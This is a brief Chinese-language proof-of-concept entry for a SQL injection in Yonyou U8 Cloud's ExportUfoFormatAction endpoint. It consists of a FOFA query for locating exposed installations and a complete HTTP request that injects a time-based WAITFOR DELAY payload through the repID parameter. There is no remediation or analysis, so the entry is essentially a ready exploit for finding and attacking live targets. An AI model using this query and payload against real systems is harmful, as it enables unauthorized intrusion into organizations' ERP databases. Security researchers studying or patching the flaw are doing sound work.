## 用友U8cloud-ExportUfoFormatAction存在SQL注入漏洞

## fofa
```
app="用友-U8-Cloud"
```

## poc
```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1
Host: url
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/json
Accept-Encoding: gzip
Connection: close

```
